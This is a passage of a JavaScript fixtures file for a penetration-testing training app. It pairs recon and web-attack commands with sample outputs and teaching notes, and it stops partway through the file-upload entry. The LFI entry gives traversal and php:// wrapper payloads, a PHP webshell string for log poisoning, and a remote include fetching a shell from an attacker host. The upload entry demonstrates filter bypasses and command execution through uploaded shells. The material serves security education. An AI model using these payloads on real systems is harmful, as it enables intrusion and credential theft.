/*!
 * obol data — study-fixtures.js — OBOL.STUDY_FIXTURES
 *
 * The one piece of the study cell NOT derivable from the packs: a representative sample of what each
 * move's output looks like, the one line that matters ("signal"), and a plain teach note about why.
 *
 * COHERENCE CONTRACT (enforced by tests/engine/study-smoke.js): every fixture pins `cmd` — the exact
 * command its `output` came from — and the Watch replay types THAT command above the result. `tool`
 * is its tool. The output is pure tool result: it never re-types a `$ command` echo, so the command
 * the learner sees and the output below it are always one real run, never a sample paired against a
 * different command. `signal` is one real line of the output (the evidence that matters).
 *
 * `situation` / `choices` / `coach` drive the "Your turn" retrieval-practice gear; they are merged in
 * from PRACTICE at the bottom. The verdict for each choice (correct / also-valid / locked) is computed
 * in study.js from the real requires — only the choice set and nuance coaching live here.
 *
 * Commands and outputs use consistent example values: target 10.10.10.10, domain acme.internal (ACME),
 * DC01, attacker 10.10.14.5, an internal segment 172.16.5.0/24. They are invocation + sample output
 * only — the methodology, not weaponised payloads.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  OBOL.STUDY_FIXTURES = {

    // ============================ RECON ============================
    'nmap-fast-open-ports': {
      why: "This is the first thing you do on every box, and the one step you cannot skip: you cannot attack a service you have not found. The fast all-ports sweep catches the services people hide on odd numbers, a web app on 8080, SSH moved to 2222, that a default top-1000 scan walks straight past. Everything downstream (which service to enumerate, which exploit to try) is decided by what this returns, so start here, then run the slower version scan only against the ports it finds, never against all 65,535.",
      cmd: 'nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.10.10.10', tool: 'nmap',
      output: [
        'Nmap scan report for 10.10.10.10',
        'Host is up (0.021s latency).',
        'Not shown: 65532 closed tcp ports (reset)',
        'PORT     STATE SERVICE',
        '22/tcp   open  ssh',
        '80/tcp   open  http',
        '445/tcp  open  microsoft-ds',
      ].join('\n'),
      signal: '80/tcp   open  http',
      teach: 'Every open port is a door. A fast all-ports sweep first tells you what to look at (here SSH, a web server, and SMB) before you spend time on any one service.',
    },
    'nmap-version-scripts': {
      why: "Knowing a port is open tells you a door exists; knowing it runs \"Apache 2.4.49\" tells you which key to try. This scan fingerprints the exact software and version on each open port and runs nmap's safe default scripts, which pull banners, anonymous-login hints, and SMB signing status for free. Run it right after the fast sweep and only against the handful of open ports, because a specific version is a searchable CVE and the rest of your attack hinges on getting it right. Guessing the service from the port number, assuming 80 is just a plain website, is how people miss the easy win.",
      cmd: 'nmap -Pn -sC -sV -p 22,80,445 -oN scans/nmap-version.txt 10.10.10.10', tool: 'nmap',
      output: [
        'PORT    STATE SERVICE VERSION',
        '22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5',
        '80/tcp  open  http    Apache httpd 2.4.49 ((Unix))',
        '|_http-title: Acme Corp Intranet',
        '445/tcp open  netbios-ssn Samba smbd 4.6.2',
      ].join('\n'),
      signal: '80/tcp  open  http    Apache httpd 2.4.49 ((Unix))',
      teach: 'Versions are leads. "Apache 2.4.49" is a specific, searchable build, many such versions have a public CVE. Always pull the version before deciding how to attack a service.',
    },
    'nmap-vuln-scripts': {
      why: "When you want nmap itself to point at known holes, the vuln script category runs detection checks (EternalBlue, common SMB, HTTP and RDP CVEs) against the open ports. It is a fast way to surface a lead, but it only detects, it does not exploit, and it false-positives, so read a VULNERABLE line as \"go verify this\", not \"you are in\". Reach for it after the version scan when a service looks old or interesting; do not lean on it as your plan, because a clean result just means nmap's small script set recognised nothing, not that the box is safe. It is enumeration, which keeps it exam-safe.",
      cmd: 'nmap -Pn -sV --script vuln -p 80 -oN scans/nmap-vuln.txt 10.10.10.10', tool: 'nmap',
      output: [
        'PORT   STATE SERVICE VERSION',
        '80/tcp open  http    Apache httpd 2.4.49 ((Unix))',
        '| http-vuln-cve2021-41773:',
        '|   VULNERABLE: Apache 2.4.49 path traversal & RCE (CVE-2021-41773)',
        '|_    References: https://nvd.nist.gov/vuln/detail/CVE-2021-41773',
      ].join('\n'),
      signal: '|   VULNERABLE: Apache 2.4.49 path traversal & RCE (CVE-2021-41773)',
      teach: 'The vuln scripts run safe-ish checks that flag known CVEs on the open ports. Treat a VULNERABLE line as a strong lead to verify, not a guaranteed win, scripts can false-positive, so confirm before you commit.',
    },
    'nmap-udp-top': {
      why: "TCP is only half the attack surface, and UDP is the half everyone forgets. SNMP (161), DNS (53), TFTP (69) and IKE/VPN (500) all live on UDP, and any one of them can be the way in, an SNMP \"public\" string alone can dump credentials. UDP has no handshake to confirm a port, so scanning is slow and noisy with false \"open|filtered\" results; you check only the top ports and run it alongside your TCP work rather than waiting on it. Do this on every box, because the UDP-only service is the classic \"stuck for hours\" lesson.",
      cmd: 'sudo nmap -Pn -sU --top-ports 20 --open -oN scans/nmap-udp-top20.txt 10.10.10.10', tool: 'nmap',
      output: [
        'PORT    STATE SERVICE',
        '53/udp  open  domain',
        '161/udp open  snmp',
      ].join('\n'),
      signal: '161/udp open  snmp',
      teach: 'TCP is only half the surface. A quick UDP sweep of the top ports finds the services people forget (SNMP on 161, DNS on 53, TFTP on 69), and each is its own way in.',
    },
    'recon-smb-anon': {
      why: "SMB on 445 is the busiest port in a Windows network, and the first thing to try is the free one: log in as nobody. An anonymous session costs nothing and routinely hands you a readable share full of configs or scripts, the domain name, and whether SMB signing is off (which matters later for relaying). Do this the moment you see 445, before any brute-forcing, because why guess a password when the box might just let you in. A readable share like \"Profiles\" or \"Backups\" is somewhere to go hunting right away.",
      cmd: "nxc smb 10.10.10.10 -u '' -p '' --shares", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  FILE01  [*] Windows Server 2019 Build 17763 (name:FILE01) (domain:acme.internal) (signing:False)',
        'SMB  10.10.10.10  445  FILE01  [+] acme.internal\\: (Guest)',
        'SMB  10.10.10.10  445  FILE01  Share       Permissions   Remark',
        'SMB  10.10.10.10  445  FILE01  IPC$                      Remote IPC',
        'SMB  10.10.10.10  445  FILE01  Profiles    READ',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  FILE01  Profiles    READ',
      teach: 'An anonymous ("-u \'\' -p \'\'") SMB check costs nothing and often hands you a readable share and the domain name. A READ share like Profiles is a place to hunt for files; the banner also leaks that signing is off.',
    },
    'recon-web-triage': {
      why: "A web app is the single richest attack surface on the exam, but before you fuzz anything you need to know what you are looking at. Fingerprinting the stack in one request (server, language, framework, CMS, page title) decides which exploits and which wordlists are even worth trying, hunting WordPress plugins on a .NET site is wasted time. Run this the instant you see 80 or 443, right after the version scan. It is the cheap step that aims every expensive step after it.",
      cmd: 'whatweb -a3 http://10.10.10.10', tool: 'whatweb',
      output: [
        'http://10.10.10.10 [200 OK] Apache[2.4.49], HTTPServer[Unix][Apache/2.4.49 (Unix)],',
        'IP[10.10.10.10], PHP[7.4.3], Title[Acme Corp Intranet], X-Powered-By[PHP/7.4.3]',
      ].join('\n'),
      signal: 'Apache[2.4.49]',
      teach: 'whatweb fingerprints the stack in one request, web server, language, CMS, title. Knowing it is Apache 2.4.49 + PHP 7.4 steers which exploits and wordlists make sense before you touch the site further.',
    },
    'recon-dns': {
      why: "A nameserver is meant to answer a zone transfer only to its own backup servers, but admins leave AXFR open to the world constantly, and when they do, one request hands you every hostname in the domain: internal apps, dev boxes, mail servers, names you would otherwise have to brute-force. It costs one command and makes almost no noise, so it is always worth trying when you see port 53. If AXFR is refused (the common case) you have lost nothing and fall back to brute-forcing records. Every name you collect is a new target and a new vhost to fuzz.",
      cmd: 'dig axfr acme.internal @10.10.10.10', tool: 'dig',
      output: [
        '; <<>> DiG 9.18.12 <<>> axfr acme.internal @10.10.10.10',
        'acme.internal.          604800 IN SOA dc01.acme.internal. admin.acme.internal. 3 604800 86400',
        'dc01.acme.internal.     604800 IN A   10.10.10.10',
        'dev.acme.internal.      604800 IN A   10.10.10.25',
        'intranet.acme.internal. 604800 IN A   10.10.10.30',
      ].join('\n'),
      signal: 'intranet.acme.internal. 604800 IN A   10.10.10.30',
      teach: 'A DNS zone transfer (AXFR) that succeeds hands you the whole internal name map in one request, every host and subdomain the admin forgot to lock down. Those new names are new targets.',
    },
    'recon-snmp': {
      why: "SNMP on UDP 161 is a quiet goldmine because of one default nobody changes: the \"public\" community string. If it answers, you can read the device's running processes, network interfaces, installed software, and on misconfigured hosts actual credentials, with no login at all. Reach for it whenever a UDP scan shows 161 open; it is high value for almost no effort. People skip UDP and never find this, which is exactly why it keeps working.",
      cmd: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.10', tool: 'onesixtyone',
      output: [
        'Scanning 1 hosts, 3220 communities',
        '10.10.10.10 [public] Linux dev01 5.4.0-91-generic #102-Ubuntu SMP x86_64',
      ].join('\n'),
      signal: '10.10.10.10 [public] Linux dev01 5.4.0-91-generic #102-Ubuntu SMP x86_64',
      teach: 'An SNMP community string of "public" is a default nobody changed. onesixtyone confirms it answers; with it (via snmpwalk) you can read running processes, users, and sometimes credentials, no login required.',
    },
    'recon-ike-vpn': {
      why: "UDP 500 is an IKE endpoint, the handshake service for an IPsec VPN. Enumerating it confirms the VPN is there and can leak the vendor and supported transforms, and an aggressive-mode handshake can hand you a hash to crack offline for a way into the internal network. It is niche, so reach for it only when 500/udp shows up; most boxes will not have it. When it does appear it is often the intended path in, and easy to walk past if you ignore UDP.",
      cmd: 'sudo ike-scan -M 10.10.10.10', tool: 'ike-scan',
      output: [
        'Starting ike-scan 1.9.5 with 1 hosts',
        '10.10.10.10  Main Mode Handshake returned',
        '  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)',
        'Ending ike-scan: 1 hosts scanned, 1 returned handshake',
      ].join('\n'),
      signal: '  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds)',
      teach: 'An IKE/IPsec VPN on UDP 500 reveals its crypto. A dated 3DES/SHA1/PSK config is a finding on its own, and if the server also allows Aggressive Mode (ike-scan -A) it will hand back a PSK hash you can crack offline.',
    },
    'recon-finger': {
      why: "Finger (port 79) is ancient and nearly extinct, but when it is open it does one thing very well for you: it confirms real usernames and shows who is logged in. A confirmed list of accounts is the raw material for a password spray or a brute-force, so finger turns \"I am guessing names\" into \"I am guessing passwords for names I know are real\". You will rarely see it; when you do, enumerate it first, because valid usernames are worth more than almost anything else this early.",
      cmd: 'finger @10.10.10.10', tool: 'finger',
      output: [
        'Login     Name          Tty   Idle  Login Time',
        'root      root          *:0     1d  Mon 09:14',
        'bmurphy   Bob Murphy    pts/0  2:00  Mon 11:02',
      ].join('\n'),
      signal: 'bmurphy   Bob Murphy    pts/0  2:00  Mon 11:02',
      teach: 'The finger service (port 79) is ancient but still appears on old Unix boxes. It leaks real usernames and who is logged in, bmurphy is a confirmed account to spray or brute.',
    },
    'recon-vnc': {
      why: "VNC is a remote-desktop service, and the enumeration question is blunt: does it even ask for a password? A server set to \"None\" security is an unauthenticated desktop, you connect and you are looking at the box's screen. Even when it wants a password, VNC passwords are capped at eight characters and crack fast. Check this whenever you see a 59xx port; it is one of the rare services where enumeration and full compromise can be the same step.",
      cmd: 'nmap -p 5900,5901 --script vnc-info,realvnc-auth-bypass 10.10.10.10', tool: 'nmap',
      output: [
        'PORT     STATE SERVICE',
        '5900/tcp open  vnc',
        '| vnc-info:',
        '|   Protocol version: 3.8',
        '|   Security types:',
        '|_    None (1) - no password required',
      ].join('\n'),
      signal: '|_    None (1) - no password required',
      teach: 'A VNC server that offers "None" security is an unauthenticated remote desktop, connect and you are on the box\'s screen. Even when it wants a password, VNC passwords are short and crackable.',
    },
    'recon-smtp': {
      why: "A mail server that answers VRFY or EXPN will confirm, for free, which usernames actually exist on the system. That is the value here: you turn a guessed name list into a verified one, which makes a later password spray far more likely to land. SMTP (25) also leaks the server software and sometimes the internal hostname in its banner. Reach for it early when 25 is open, because every other credential attack gets cheaper once you know the real usernames.",
      cmd: 'smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10', tool: 'smtp-user-enum',
      output: [
        'Starting smtp-user-enum v1.2',
        '10.10.10.10: root exists',
        '10.10.10.10: bmurphy exists',
        '10.10.10.10: nonexistent does not exist',
      ].join('\n'),
      signal: '10.10.10.10: bmurphy exists',
      teach: 'An SMTP server that answers VRFY confirms which usernames are real. A confirmed user list is the raw material for a password spray or a brute, you stop guessing names and start guessing passwords.',
    },
    'recon-ftp': {
      why: "FTP's first test is free and almost always worth it: try the anonymous login. Boxes leave it open constantly, and an anonymous session routinely exposes a directory of source code, backups, or config files with credentials in them, a foothold sitting in plain sight. Do this the moment you see port 21, before brute-forcing a real account. Download everything you can read and look through it, because the win is usually in a file, not in the service itself.",
      cmd: "nxc ftp 10.10.10.10 -u anonymous -p ''", tool: 'nxc',
      output: [
        'FTP  10.10.10.10  21  FTP01  [*] Banner: 220 (vsFTPd 3.0.3)',
        'FTP  10.10.10.10  21  FTP01  [+] anonymous: (Anonymous login successful)',
        'FTP  10.10.10.10  21  FTP01  -rw-r--r-- 1 ftp ftp 1024 Jan 08 09:12 backup.zip',
      ].join('\n'),
      signal: 'FTP  10.10.10.10  21  FTP01  [+] anonymous: (Anonymous login successful)',
      teach: 'Anonymous FTP is a free login, always test it. A readable file like backup.zip often holds source, configs, or credentials; download everything and look through it.',
    },
    'recon-mail': {
      why: "Once you hold a mailbox credential, reading the mail is itself an attack: people send passwords, VPN configs, and password-reset links to each other, and the inbox is where that history lives. This step logs into POP3 or IMAP with creds you already recovered and pulls the messages so you can mine them. Reach for it after you have a working credential and see 110/143/993/995 open; the mailbox often hands you the next credential or the next host.",
      cmd: 'nmap -sV -p 110,143,993,995 --script pop3-capabilities,pop3-ntlm-info 10.10.10.10', tool: 'nmap',
      output: [
        'PORT    STATE SERVICE',
        '110/tcp open  pop3',
        '143/tcp open  imap',
        '|_pop3-capabilities: USER TOP UIDL',
        '| pop3-ntlm-info:',
        '|_  Domain: ACME',
      ].join('\n'),
      signal: '|_  Domain: ACME',
      teach: 'Mail services leak more than you expect: capabilities, and via NTLM auth the internal domain name (ACME). With a valid mailbox credential you can read mail for secrets, reset links, and internal contacts.',
    },
    'rdp-enum': {
      why: "RDP on 3389 is both a service to check and, with a working credential, your way onto the desktop. Enumeration answers two questions: is Network Level Authentication required (which blocks some attacks), and do the credentials you already hold actually log in here. A \"Pwn3d!\" against RDP means an interactive session is waiting, so always confirm which creds work against which service, a password that fails on SMB can still open RDP. Check it whenever 3389 is open and you have any credential to test.",
      cmd: "nxc rdp 10.10.10.10 -u bmurphy -p 'Summer2024!'", tool: 'nxc',
      output: [
        'RDP  10.10.10.10  3389  TARGET  [*] Windows 10 / Server 2019 Build 17763 (name:TARGET) (domain:ACME)',
        'RDP  10.10.10.10  3389  TARGET  [+] ACME\\bmurphy:Summer2024! (Pwn3d!)',
      ].join('\n'),
      signal: 'RDP  10.10.10.10  3389  TARGET  [+] ACME\\bmurphy:Summer2024! (Pwn3d!)',
      teach: '"Pwn3d!" on an RDP check means the credentials you tested actually log in, you have an interactive desktop waiting (connect with xfreerdp). Always confirm which creds work against which service.',
    },
    'nfs-enum': {
      why: "NFS (111 and 2049) shares a filesystem over the network, and the enumeration step asks what is exported and to whom. An export shared with \"*\" is readable by anyone who mounts it, and if it is exported with no_root_squash you can write files as root on it, which is a direct privilege-escalation primitive, not just a file read. Reach for it the moment you see those ports: mount the share, read what you can, and check the squash setting, because an NFS misconfiguration is often the foothold and the root in one service.",
      cmd: 'showmount -e 10.10.10.10', tool: 'showmount',
      output: [
        'Export list for 10.10.10.10:',
        '/srv/home    *',
        '/var/backups 10.10.10.0/24',
      ].join('\n'),
      signal: '/srv/home    *',
      teach: 'An NFS export shared with "*" is readable by anyone who mounts it. Mount it locally and you can read other users\' files, and often, with a matching UID, write them too. A classic foothold and privesc in one.',
    },

    // ============================ WEB ============================
    'vhost-discovery': {
      leadup: [{"key":"scan","label":"From the port scan","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"See the default site","tool":"curl","where":"local","cmd":"curl -s -I http://<target>/","out":"HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nContent-Type: text/html","sig":"Server: Apache/2.4.41 (Ubuntu)","teach":"One IP often serves several name-based sites; the default page is only the first, so you fuzz the Host header for the rest."}]}],
      why: "One IP can host many sites, and the extra ones are usually where the bugs live: a \"dev\" or \"staging\" vhost is less hardened than the production site everyone tests. Reach for this once you have a domain name (from a TLS certificate, a redirect, or DNS) and the main site looks boring. It is cheap, and it is often the difference between \"stuck on a plain website\" and \"found the real app\". Add every vhost you discover to your hosts file so you can actually browse it.",
      cmd: 'ffuf -u http://10.10.10.10 -H "Host: FUZZ.acme.internal" -w subdomains.txt -mc 200,301,302 -fs 0', tool: 'ffuf',
      output: [
        ':: Method           : GET',
        'dev                     [Status: 200, Size: 5210, Words: 412, Lines: 98]',
        'staging                 [Status: 200, Size: 1840, Words: 95, Lines: 40]',
      ].join('\n'),
      signal: 'staging                 [Status: 200, Size: 1840, Words: 95, Lines: 40]',
      teach: 'One IP can serve many sites by Host header. Fuzzing virtual hosts surfaces ones with no public link, a "staging" or "dev" vhost is usually less hardened than production and is where the bug lives.',
    },
    'content-discovery': {
      leadup: [{"key":"scan","label":"From the port scan","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."}]}],
      why: "A website shows you only what it links to; the interesting things, admin panels, backups, an exposed .git, API routes, are reachable but hidden, and brute-forcing paths is how you find them. This is the single highest-value thing to run against any web app, so start it early and let it work in the background while you look at the site by hand. Your wordlist matters more than the tool: a bigger, smarter list finds what a tiny one walks past.",
      cmd: 'feroxbuster -u http://10.10.10.10 -w raft-medium-directories.txt -o scans/ferox.txt', tool: 'feroxbuster',
      output: [
        '200      GET       24l       68w     /index.php',
        '301      GET        9l       28w     /uploads => http://10.10.10.10/uploads/',
        '200      GET       11l       33w     /admin/login.php',
        '403      GET        9l       28w     /.git',
      ].join('\n'),
      signal: '200      GET       11l       33w     /admin/login.php',
      teach: 'Brute-forcing paths uncovers what is not linked anywhere, an admin login, an uploads directory, a leaking .git. Each hit is a new place to attack; chase the interesting ones (admin, upload, config) first.',
    },
    'param-discovery': {
      leadup: [{"key":"scan","label":"From content discovery","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Brute-force the paths","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"200      GET  /index.html\n200      GET  /product.php\n200      GET  /upload.php","sig":"200      GET  /product.php","teach":"Content discovery maps the real pages; each dynamic one (product.php, upload.php) is a surface to attack in turn."}]}],
      why: "A page can accept parameters that appear nowhere in its HTML, and the hidden one is often the vulnerable one, a leftover debug switch or a \"file\" parameter. Fuzzing parameter names surfaces them so you have something concrete to test for LFI, SQLi, or SSRF. Reach for it when a page looks static but you suspect there is more behind it, or when one known parameter hints at siblings. It turns \"nothing to attack here\" into a list of inputs worth probing.",
      cmd: 'arjun -u http://10.10.10.10/view.php -m GET', tool: 'arjun',
      output: [
        '[*] Scanning http://10.10.10.10/view.php',
        '[*] Analysing HTTP response for anomalies',
        '[+] Parameter detected: page, based on: status code, body length',
      ].join('\n'),
      signal: '[+] Parameter detected: page, based on: status code, body length',
      teach: 'A page can hide inputs that nothing links to. arjun fuzzes parameter names and watches the response change, finding a hidden "page" parameter gives you something to test for LFI, SQLi, or SSRF.',
    },
    'lfi-probe': {
      leadup: [{"key":"pageparam","label":"A page parameter","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find an include parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/index.php","out":"[+] Parameter detected: page (GET)","sig":"[+] Parameter detected: page (GET)","teach":"A page, file, or include parameter is the local-file-inclusion surface: it names something the server opens for you."}]},{"key":"download","label":"A download feature","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Spot a file-serving endpoint","tool":"curl","where":"local","cmd":"curl -s http://<target>/ | grep -iE 'download|view|file='","out":"<a href=\"/download.php?file=report.pdf\">Download report</a>","sig":"file=report.pdf","teach":"A download or view feature that names a file in the URL often reads whatever path you substitute, including traversal."}]}],
      how: {"lead":"Confirming the read is the easy part; the goal is turning a file read into code execution. Work from quick wins to heavier tricks:","items":[{"t":"Prove it and measure the depth","d":"Request the parameter with ../../../../etc/passwd and note how many ../ you needed. On Windows try ..\\..\\..\\windows\\win.ini. If the app strips ../, try nested ....// (it collapses back to ../) or URL-encoding (%2e%2e%2f)."},{"t":"Read real loot, not just passwd","d":"passwd proves the bug and gives usernames; the payoff is credentials in config files: /var/www/html/config.php, a .env, the Apache vhost configs, an SSH key at /home/<user>/.ssh/id_rsa, or on Windows web.config and unattend.xml."},{"t":"Pull source with the php filter wrapper","d":"php://filter/convert.base64-encode/resource=index.php returns the page's own source base64-encoded instead of executing it, so you can read code (and the credentials in it) that would normally run server-side."},{"t":"Log poisoning to RCE","d":"Write PHP into a log the server records, a User-Agent of <?php system($_GET['c']); ?> into the Apache access log, or into the SSH auth log, then LFI that log file so your code runs. Read the log path via LFI first to confirm where it lives."},{"t":"Session and wrapper RCE","d":"If you can get attacker data into a PHP session file (/var/lib/php/sessions/sess_<id>) or /tmp, include it to execute poisoned PHP. The data:// and php://input wrappers also give direct RCE when allow_url_include is on."},{"t":"RFI when the config allows it","d":"If allow_url_include is enabled (rare, but it happens on old boxes), point the parameter at http://<you>/shell.txt to pull and run a remote payload with no local write at all."}]},
      why: "When a parameter names a file to load (page=, file=, include=), it is worth one quick traversal test, because reading arbitrary files is a short path to credentials, source code, and often a shell. The /etc/passwd read is only the proof; the payoff is config files with database passwords and, through log poisoning or PHP wrappers, code execution. Try it on any include-looking parameter. If it works you have a username list and your next several moves at once.",
      cmd: "curl -s 'http://10.10.10.10/view.php?page=../../../../etc/passwd'", tool: 'curl',
      output: [
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'bmurphy:x:1000:1000:Bob Murphy:/home/bmurphy:/bin/bash',
      ].join('\n'),
      signal: 'root:x:0:0:root:/root:/bin/bash',
      teach: 'When /etc/passwd comes back in the page, the "page" parameter reads arbitrary files, Local File Inclusion. It confirms traversal and leaks real usernames (bmurphy); next you try log poisoning or PHP wrappers for code execution.',
    },
    'file-upload': {
      leadup: [
        { key: 'ferox', label: 'Content discovery', steps: [
          { title: 'Scan the ports', tool: 'nmap', where: 'local',
            cmd: 'nmap -p- --min-rate 5000 -sV <target>',
            out: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            sig: '80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            teach: 'A web server answers on 80, so the attack surface is the app itself, not the hardened SSH login.' },
          { title: 'Brute-force the paths', tool: 'feroxbuster', where: 'local',
            cmd: 'feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt',
            out: '200      GET  /index.html\n301      GET  /uploads => http://<target>/uploads/\n200      GET  /upload.php',
            sig: '200      GET  /upload.php',
            teach: 'Content discovery turns up an upload page and the /uploads/ directory it writes to, the exact pair this attack needs.' },
        ] },
        { key: 'browse', label: 'Clicking around', steps: [
          { title: 'Scan the ports', tool: 'nmap', where: 'local',
            cmd: 'nmap -p- --min-rate 5000 -sV <target>',
            out: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            sig: '80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            teach: 'A web server answers on 80, so the attack surface is the app itself, not the hardened SSH login.' },
          { title: 'Spot a form while browsing', tool: 'curl', where: 'local',
            cmd: 'curl -s http://<target>/profile | grep -i enctype',
            out: '<form action="/profile/avatar" method="post" enctype="multipart/form-data">\n  <input type="file" name="avatar" accept="image/*">',
            sig: 'enctype="multipart/form-data"',
            teach: 'No brute-forcing needed here: just using the app, the profile page offers an avatar upload. Any multipart form that takes a file is a candidate, linked or not.' },
        ] },
        { key: 'vhost', label: 'A hidden vhost', steps: [
          { title: 'Scan the ports', tool: 'nmap', where: 'local',
            cmd: 'nmap -p- --min-rate 5000 -sV <target>',
            out: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            sig: '80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            teach: 'A web server answers on 80, so the attack surface is the app itself, not the hardened SSH login.' },
          { title: 'Fuzz for virtual hosts', tool: 'ffuf', where: 'local',
            cmd: 'ffuf -u http://<target>/ -H "Host: FUZZ.<target>" -w subdomains.txt -fs 1256',
            out: 'portal                  [Status: 200, Size: 4823]\nadmin                   [Status: 200, Size: 3310]',
            sig: 'portal                  [Status: 200, Size: 4823]',
            teach: 'A virtual-host fuzz uncovers an internal portal the default site never serves, and its member area exposes a document upload the public pages hide.' },
        ] },
      ],
      how: {"lead":"The upload almost never just takes your shell. You beat the filter, then make sure the file lands somewhere that actually executes. Pick a trick on the left and watch it play out:","items":[{"t":"Learn the filter type first","d":"A blacklist blocks known-bad extensions (.php, .asp); a whitelist allows only known-good (.jpg, .png). Blacklists are leaky and usually beatable; whitelists need a trick that still counts as allowed. Upload a plain file and read the error so you know which you face.","demo":[{"run":"curl -s -F \"file=@test.php\" http://<target>/upload.php","out":"{\"error\":\"File type not allowed. Allowed: jpg, png, gif\"}","sig":"Allowed: jpg, png, gif"}],"note":"The error tells you it is a whitelist and names what it accepts, so you know which trick to reach for."},{"t":"Try the whole executable-extension family","d":"When .php is blocked the server often still runs .phtml, .php3, .php4, .php5, .php7, .pht or .phar; ASP has .asp, .aspx, .asa, .cer, .cdx; JSP has .jsp, .jspx, .jsw. One of them is usually missing from the blacklist.","demo":[{"run":"curl -s -F \"file=@shell.phtml\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.phtml\"}","sig":"/uploads/shell.phtml"},{"run":"curl -s \"http://<target>/uploads/shell.phtml?c=id\"","out":"uid=33(www-data) gid=33(www-data) groups=33(www-data)","sig":"uid=33(www-data)"}],"note":".phtml was not on the blacklist, but the server still runs it as PHP. One request proves execution."},{"t":"Case and trailing tricks","d":"Some filters only match lowercase, so try shell.pHp. Others miss a trailing dot, space, or stream name: shell.php. , shell.php%20, or shell.php::$DATA on IIS. On old PHP a null byte truncates: shell.php%00.jpg. Bypass the exact string the filter checks.","demo":[{"run":"curl -s -F \"file=@shell.pHp\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.pHp\"}","sig":"/uploads/shell.pHp"}],"note":"The filter lower-cased nothing, so .pHp sailed past a check that only looked for \".php\"."},{"t":"Double extensions","d":"An Apache with a loose AddHandler runs anything containing .php, so shell.php.jpg executes while passing a must-end-in-.jpg check. Also try shell.jpg.php, where the app checks the first extension but the server honours the last.","demo":[{"run":"curl -s -F \"file=@shell.php.jpg\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.php.jpg\"}","sig":"shell.php.jpg"},{"run":"curl -s \"http://<target>/uploads/shell.php.jpg?c=whoami\"","out":"www-data","sig":"www-data"}],"note":"The name ends in .jpg (so the whitelist is happy) but contains .php, so Apache runs it."},{"t":"Spoof the Content-Type","d":"If the filter trusts the request's MIME type, change the upload's Content-Type header to image/png while keeping your real payload. This defeats naive checks that believe whatever the client declares.","demo":[{"run":"curl -s -F \"file=@shell.php;type=image/png\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.php\"}","sig":"/uploads/shell.php"}],"note":"The ;type=image/png part sets the MIME the filter checks, while the bytes are still PHP."},{"t":"Forge the magic bytes","d":"When the server inspects file content, prepend real image magic bytes so it looks like an image and still runs: start the file with GIF89a, then your <?php ?> code. A polyglot 